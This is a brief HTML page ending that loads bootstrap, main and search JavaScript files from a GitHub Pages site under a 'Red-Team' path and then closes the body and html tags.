<script src="https://mmnoureldin.github.io/Red-Team/js/bootstrap.min.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/main.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/search.js"></script> 




</body>
   </html>
